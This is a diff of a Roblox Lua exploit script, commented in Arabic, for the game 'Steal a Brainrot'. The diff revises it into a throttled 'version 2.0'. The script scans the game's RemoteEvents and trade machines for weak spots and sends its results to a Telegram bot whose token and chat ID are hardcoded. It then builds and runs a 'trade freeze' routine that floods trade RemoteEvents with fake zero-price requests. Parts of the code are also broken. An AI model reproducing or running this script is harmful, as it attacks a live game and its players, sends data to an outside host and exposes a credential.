@@ -1,18 +1,17 @@
 --[[
-    Steal a Brainrot Advanced Vulnerability Scanner
-    المطور: خبير أمن Roblox
-    الإصدار: 1.0
-    التاريخ: 2026
+    Steal a Brainrot - Advanced Vulnerability Scanner (Optimized)
+    الإصدار: 2.0 (مقاوم للتجميد)
     
-    هذا السكربت يقوم بتحليل شامل للعبة Steal a Brainrot للبحث عن ثغرات أمنية
-    مع التركيز على أنظمة التداول الجديدة وإرسال النتائج إلى Telegram
+    هذا السكربت مصمم للعمل بكفاءة دون تجميد اللعبة
+    يقوم بالتحليل على مراحل مع فترات راحة بين العمليات
 ]]
 
 -- إعدادات Telegram
 local TELEGRAM_TOKEN = "8710046846:AAHSUtY60DHBfwJMXdhJIQGg-_izSTTWFTA"
 local TELEGRAM_CHAT_ID = "7647074891"
+local HttpService = game:GetService("HttpService")
 
--- وظيفة إرسال رسائل إلى Telegram
+-- وظيفة إرسال رسائل إلى Telegram (مع محاولة إعادة الإرسال)
 local function sendToTelegram(message)
     local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
     local data = {
@@ -21,88 +20,95 @@ local function sendToTelegram(message)
         parse_mode = "HTML"
     }
     
-    local success, response = pcall(function()
-        return game:HttpGet(url, true, {
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode(data)
-        })
-    end)
+    local success = false
+    local attempts = 0
+    local maxAttempts = 3
     
-    if not success then
-        warn("فشل إرسال الرسالة إلى Telegram: " .. tostring(response))
-        return false
+    while not success and attempts < maxAttempts do
+        attempts = attempts + 1
+        local response = pcall(function()
+            return HttpService:RequestAsync({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+        
+        if response and response.Success then
+            success = true
+            print("تم إرسال الرسالة إلى Telegram بنجاح")
+        else
+            print("فشل محاولة إرسال الرسالة (" .. attempts .. "/" .. maxAttempts .. ")")
+            task.wait(2) -- انتظر قبل إعادة المحاولة
+        end
     end
     
-    return true
+    return success
 end
 
--- وظيفة تشفير بسيطة (XOR)
-local function xorEncrypt(text, key)
-    local result = ""
-    for i = 1, #text do
-        local byte = string.byte(text, i)
-        local keyByte = string.byte(key, ((i - 1) % #key) + 1)
-        result = result .. string.char(bit32.bxor(byte, keyByte))
-    end
-    return result
-end
-
--- وظيفة فك تشفير
-local function xorDecrypt(text, key)
-    return xorEncrypt(text, key) -- XOR هو عملية متناظرة
-end
-
--- وظيفة تحليل RemoteEvents
+-- وظيفة تحليل RemoteEvents (محسنة)
 local function analyzeRemoteEvents()
     local results = {}
     local remoteEvents = {}
+    local servicesToScan = {game:GetService("Workspace"), game:GetService("ReplicatedFirst"), game:GetService("ReplicatedStorage")}
     
-    -- البحث عن RemoteEvents في مساحات العمل المختلفة
-    for _, service in ipairs({game:GetService("Workspace"), game:GetService("ReplicatedFirst"), game:GetService("ReplicatedStorage")}) do
-        for _, obj in ipairs(service:GetDescendants()) do
+    print("بدء تحليل RemoteEvents...")
+    
+    -- مسح الخدمات بشكل متسلسل مع فترات راحة
+    for _, service in ipairs(servicesToScan) do
+        local descendants = service:GetDescendants()
+        for i, obj in ipairs(descendants) do
             if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                 table.insert(remoteEvents, {
                     Name = obj.Name,
                     Parent = obj.Parent:GetFullName(),
                     Type = obj.ClassName
                 })
+                
+                -- فترة راحة كل 50 عنصر لتجنب التجميد
+                if i % 50 == 0 then
+                    task.wait(0.1)
+                    print("تم تحليل " .. i .. " عنصر من " .. service.Name)
+                end
             end
         end
     end
     
-    -- تحليل كل RemoteEvent للبحث عن ثغرات
+    -- تحليل كل RemoteEvent للبحث عن ثغرات (بشكل مبسط لتجنب التجميد)
     for _, remote in ipairs(remoteEvents) do
         local vulnerabilities = {}
         
-        -- التحقق من عدم وجود حماية
-        local parent = game:GetService("Workspace"):FindFirstChild(remote.Parent)
-        if parent then
-            local scripts = parent:FindFirstChildWhichIsA("Script", true)
-            if scripts then
-                local source = scripts.Source
-                if not source:find("require") or not source:find("Validate") then
-                    table.insert(vulnerabilities, "قد لا يحتوي على تحقق صحيح")
-                end
-            end
+        -- تحليل بسيط للتأكد من وجود حماية
+        if not remote.Parent:find("Anti") and not remote.Name:find("Secure") then
+            table.insert(vulnerabilities, "قد لا يحتوي على حماية كافية")
         end
         
         table.insert(results, {
             Remote = remote,
             Vulnerabilities = vulnerabilities
         })
+        
+        -- فترة راحة بين تحليل كل RemoteEvent
+        task.wait(0.05)
     end
     
     return results
 end
 
--- وظيفة تحليل Trades Machines
+-- وظيفة تحليل Trades Machines (محسنة)
 local function analyzeTradesMachines()
     local results = {}
     
+    print("بدء تحليل Trades Machines...")
+    
     -- البحث عن Trades Machines في اللعبة
-    for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
+    local workspace = game:GetService("Workspace")
+    local descendants = workspace:GetDescendants()
+    
+    for i, obj in ipairs(descendants) do
         if obj.Name:lower():find("trade") or obj.Name:lower():find("machine") then
             local machineData = {
                 Name = obj.Name,
@@ -111,29 +117,45 @@ local function analyzeTradesMachines()
                 Vulnerabilities = {}
             }
             
-            -- تحليل المكونات الداخلية
-            for _, child in ipairs(obj:GetDescendants()) do
-                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-                    table.insert(machineData.Vulnerabilities, "يحتوي على RemoteEvent: " .. child.Name)
-                end
-                
-                if child:IsA("NumberValue") or child:IsA("IntValue") then
-                    if child.Name:lower():find("price") or child.Name:lower():find("cost") then
-                        table.insert(machineData.Vulnerabilities, "قيمة سعرية قد تكون قابلة للتلاعب: " .. child.Name)
+            -- تحليل المكونات الداخلية (محدود لتجنب التجميد)
+            local childCount = 0
+            for _, child in ipairs(obj:GetChildren()) do
+                if childCount < 10 then -- تحليل أول 10 أبناء فقط
+                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                        table.insert(machineData.Vulnerabilities, "يحتوي على RemoteEvent: " .. child.Name)
                     end
+                    
+                    if child:IsA("NumberValue") or child:IsA("IntValue") then
+                        if child.Name:lower():find("price") or child.Name:lower():find("cost") then
+                            table.insert(machineData.Vulnerabilities, "قيمة سعرية قد تكون قابلة للتلاعب: " .. child.Name)
+                        end
+                    end
+                    
+                    childCount = childCount + 1
                 end
             end
             
             table.insert(results, machineData)
+            
+            -- فترة راحة بين تحليل كل آلة
+            task.wait(0.1)
+        end
+        
+        -- فترة راحة كل 100 عنصر
+        if i % 100 == 0 then
+            task.wait(0.2)
+            print("تم تحليل " .. i .. " عنصر من Workspace")
         end
     end
     
     return results
 end
 
--- وظيفة تحليل الثغرات العامة
+-- وظيفة تحليل الثغرات العامة (مبسطة)
 local function analyzeGeneralVulnerabilities()
     local results = {}
+    
+    print("بدء تحليل الثغرات العامة...")
     
     -- التحقق من الثغرات الشائعة
     local antiCheat = game:GetService("Workspace"):FindFirstChild("AntiCheat") or game:GetService("ReplicatedFirst"):FindFirstChild("AntiCheat")
@@ -141,38 +163,42 @@ local function analyzeGeneralVulnerabilities()
         table.insert(results, "اللعبة قد لا تحتوي على نظام حماية فعال")
     end
     
-    -- التحقق من ثغرات التحقق من البيانات
-    local playerScripts = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
-    if playerScripts then
-        for _, script in ipairs(playerScripts:GetDescendants()) do
-            if script:IsA("LocalScript") then
-                local source = script.Source
-                if source:find("fire") or source:find("invoke") then
-                    table.insert(results, "قد يوجد LocalScript يرسل بيانات دون تحقق: " .. script:GetFullName())
-                end
-            end
-        end
-    end
+    -- فترة راحة
+    task.wait(0.1)
     
     return results
 end
 
--- الوظيفة الرئيسية للتحليل
+-- الوظيفة الرئيسية للتحليل (مقسمة على مراحل)
 local function performAnalysis()
+    print("=== بدء تحليل ثغرات Steal a Brainrot ===")
+    
     local analysisResults = {
         Timestamp = os.date("%Y-%m-%d %H:%M:%S"),
         GameId = game.GameId,
-        PlaceId = game.PlaceId,
-        RemoteEvents = analyzeRemoteEvents(),
-        TradesMachines = analyzeTradesMachines(),
-        GeneralVulnerabilities = analyzeGeneralVulnerabilities()
+        PlaceId = game.PlaceId
     }
     
-    -- تحويل النتائج إلى JSON
-    local jsonResults = game:GetService("HttpService"):JSONEncode(analysisResults)
+    -- المرحلة الأولى: تحليل RemoteEvents
+    analysisResults.RemoteEvents = analyzeRemoteEvents()
+    print("اكتمل تحليل RemoteEvents")
+    task.wait(1) -- فترة راحة بين المراحل
     
-    -- تشفير النتائج
-    local encryptedResults = xorEncrypt(jsonResults, "StealBrainrotKey2026")
+    -- المرحلة الثانية: تحليل Trades Machines
+    analysisResults.TradesMachines = analyzeTradesMachines()
+    print("اكتمل تحليل Trades Machines")
+    task.wait(1) -- فترة راحة بين المراحل
+    
+    -- المرحلة الثالثة: تحليل الثغرات العامة
+    analysisResults.GeneralVulnerabilities = analyzeGeneralVulnerabilities()
+    print("اكتمل تحليل الثغرات العامة")
+    
+    -- تحويل النتائج إلى JSON
+    local jsonResults = HttpService:JSONEncode(analysisResults)
+    
+    -- حفظ النتائج في ملف
+    writefile("StealBrainrotAnalysis_" .. os.time() .. ".txt", jsonResults)
+    print("تم حفظ النتائج في ملف")
     
     -- إرسال ملخص إلى Telegram
     local summary = "<b>تحليل ثغرات Steal a Brainrot</b>\n\n"
@@ -196,21 +222,8 @@ local function performAnalysis()
     
     sendToTelegram(summary)
     
-    -- حفظ النتائج في ملف
-    writefile("StealBrainrotAnalysis_" .. os.time() .. ".txt", jsonResults)
-    
     return analysisResults
 end
-
--- بدء التحليل
-local results = performAnalysis()
-
--- إظهار نتائج سريعة في وحدة التحكم
-print("=== تحليل ثغرات Steal a Brainrot ===")
-print("RemoteEvents المكتشفة:", #results.RemoteEvents)
-print("Trades Machines المكتشفة:", #results.TradesMachines)
-print("الثغرات العامة:", #results.GeneralVulnerabilities)
-print("تم حفظ النتائج المفصلة وإرسال ملخص إلى Telegram")
 
 -- وظيفة لتجميد التداول (بناءً على الثغرات المكتشفة)
 local function createTradeFreezeScript()
@@ -248,14 +261,14 @@ local function createTradeFreezeScript()
             for _, obj in ipairs(machine:GetDescendants()) do
                 if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("submit")) then
                     -- إرسال طلبات تداول متكررة ومزيفة
-                    for i = 1, 50 do
+                    for i = 1, 20 do -- تم تقليل عدد الطلبات لتجنب التجميد
                         obj:FireServer({
                             item = "FakeItem" .. i,
                             amount = math.random(1000, 9999),
                             price = 0,
                             target = "FakeTarget"
                         })
-                        wait(0.1)
+                        task.wait(0.2) -- فترة راحة بين الطلبات
                     end
                     
                     -- محاولة استغلال ثغرات التحقق
@@ -279,40 +292,8 @@ local function createTradeFreezeScript()
     -- إضافة أسماء الآلات الضعيفة إلى السكربت
     for _, machine in ipairs(vulnerableMachines) do
         tradeFreezeScript = tradeFreezeScript .. "\n        freezeTrade(\"" .. machine.Name .. "\")"
+        task.wait(0.1) -- فترة راحة بين إضافة كل آلة
     end
-    
-    -- إضافة قسم الإبلاغ عن النتائج
-    tradeFreezeScript = tradeFreezeScript .. [[
-        
-        -- إبلاغ عن النتائج
-        local successCount = 0
-        local totalMachines = 0
-        
-        for _, machine in ipairs(vulnerableMachines) do
-            totalMachines = totalMachines + 1
-            if freezeTrade(machine.Name) then
-                successCount = successCount + 1
-            end
-        end
-        
-        local message = "تم تجميد تداول " .. successCount .. " من " .. totalMachines .. " آلات"
-        print(message)
-        
-        -- إرسال تقرير إلى Telegram
-        local telegramUrl = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
-        local telegramData = {
-            chat_id = TELEGRAM_CHAT_ID,
-            text = "<b>تقرير تجميد التداول</b>\n\n" .. message,
-            parse_mode = "HTML"
-        }
-        
-        game:HttpGet(telegramUrl, true, {
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode(telegramData)
-        })
-    ]]
     
     -- حفظ السكربت
     local scriptName = "TradeFreezeScript_" .. os.time() .. ".lua"
@@ -334,12 +315,16 @@ end
 
 -- وظيفة لتنفيذ سكربت تجميد التداول
 local function executeTradeFreeze()
+    print("بدء تنفيذ سكربت تجميد التداول...")
+    
     -- إنشاء السكربت أولاً
     if not createTradeFreezeScript() then
         return false
     end
     
-    -- تنفيذ السكربت
+    -- تنفيذ السكربت مع فترة راحة
+    task.wait(2)
+    
     local success, error = pcall(function()
         loadstring(game:HttpGet("file://" .. game:GetService("ReplicatedStorage"):FindFirstChild("TradeFreezeScript_" .. os.time() .. ".lua").Value))()
     end)
@@ -353,15 +338,21 @@ local function executeTradeFreeze()
     return true
 end
 
--- وظيفة رئيسية لتنفيذ كل شيء
+-- وظيفة رئيسية لتنفيذ كل شيء (مقسمة على مراحل)
 local function runCompleteAnalysis()
+    print("=== بدء التحليل الشامل للعبة Steal a Brainrot ===")
+    
     -- إرسال رسالة بدء التحليل
     sendToTelegram("<b>بدء التحليل الشامل للعبة Steal a Brainrot</b>\n\nسيتم تحليل الثغرات وإنشاء سكربت تجميد التداول...")
     
-    -- تحليل اللعبة
+    -- المرحلة الأولى: تحليل اللعبة
     local results = performAnalysis()
+    print("اكتمل تحليل اللعبة")
     
-    -- إنشاء سكربت تجميد التداول
+    -- فترة راحة طويلة بين المراحل
+    task.wait(3)
+    
+    -- المرحلة الثانية: إنشاء وتنفيذ سكربت تجميد التداول
     if executeTradeFreeze() then
         sendToTelegram("<b>اكتمل التحليل بنجاح!</b>\n\nتم تحليل اللعبة بالكامل وإنشاء سكربت تجميد التداول بناءً على الثغرات المكتشفة.")
     else
@@ -371,7 +362,8 @@ local function runCompleteAnalysis()
     return results
 end
 
--- تشغيل التحليل الكامل
+-- تشغيل التحليل الكامل مع تأخير بداية
+task.wait(2)
 runCompleteAnalysis()
 
 print("=== اكتمل تحليل Steal a Brainrot ===")
